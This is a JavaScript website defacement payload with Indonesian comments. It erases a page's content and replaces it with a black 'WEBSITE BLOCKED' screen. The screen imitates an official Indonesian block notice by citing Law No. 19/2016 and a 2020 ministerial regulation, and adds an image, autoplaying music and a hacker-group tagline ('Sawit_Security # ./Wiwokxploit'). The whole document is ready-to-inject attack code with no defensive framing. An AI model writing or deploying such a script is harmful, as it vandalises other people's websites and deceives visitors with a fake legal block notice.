document.documentElement.innerHTML = '';
document.title = "WEBSITE BLOCKED BY ILHAM ADITYA";

var body = document.body;
body.style.backgroundColor = '#000000'; 
body.style.margin = '0';
body.style.padding = '0';
body.style.display = 'flex';
body.style.justifyContent = 'center';
body.style.alignItems = 'center';
body.style.minHeight = '100vh';
body.style.fontFamily = 'Arial, sans-serif';
body.style.color = 'white';
body.style.textAlign = 'center';

// Membuat Kontainer Utama
var container = document.createElement('div');
container.style.maxWidth = '600px';
container.style.padding = '20px';

// Menambahkan Gambar Kucing (Gunakan URL gambar online agar pasti muncul)
var img = document.createElement('img');
img.src = 'image/wiwok.png'; 
img.style.width = '300px';
img.style.borderRadius = '5px';
img.style.marginBottom = '20px';
container.appendChild(img);

// Judul Utama
var h1 = document.createElement('h1');
h1.innerText = 'WEBSITE BLOCKED BY WI WOK DE TOK';
h1.style.fontSize = '24px';
h1.style.marginBottom = '10px';
container.appendChild(h1);

// Teks Undang-Undang
var uuTitle = document.createElement('p');
uuTitle.innerHTML = '<strong>UNDANG-UNDANG NOMOR 19 TAHUN 2016 PASAL 40 (2a) dan (2b) TENTANG INFORMASI DAN TRANSAKSI ELEKTRONIK</strong>';
uuTitle.style.fontSize = '14px';
uuTitle.style.marginBottom = '15px';
container.appendChild(uuTitle);

var uuDesc = document.createElement('p');
uuDesc.innerText = 'Indonesia Law No.19 Year 2016 Article 40 (2a) and (2b) regarding Information and Electronic Transaction PERATURAN MENTERI KOMUNIKASI DAN INFORMATIKA NO.5 TAHUN 2020 TENTANG PENYELENGGARA SISTEM ELEKTRONIK LINGKUP PRIVAT...';
uuDesc.style.fontSize = '12px';
uuDesc.style.lineHeight = '1.4';
uuDesc.style.opacity = '0.9';
container.appendChild(uuDesc);

// Tagline Hacker
var footer = document.createElement('p');
footer.innerHTML = '<br><strong>WI WOK DE TOK|Sawit_Security # ./Wiwokxploit</strong><br>#pemberantasan_SAWIT';
footer.style.fontSize = '14px';
container.appendChild(footer);

// Audio Player (Autoplay mungkin diblokir browser, jadi munculkan controllernya)
var audio = document.createElement('audio');
audio.src = 'song/wiwok.mp3'; // Ganti dengan URL musik kamu
audio.controls = true;
audio.autoplay = true;
audio.style.marginTop = '20px';
container.appendChild(audio);

body.appendChild(container);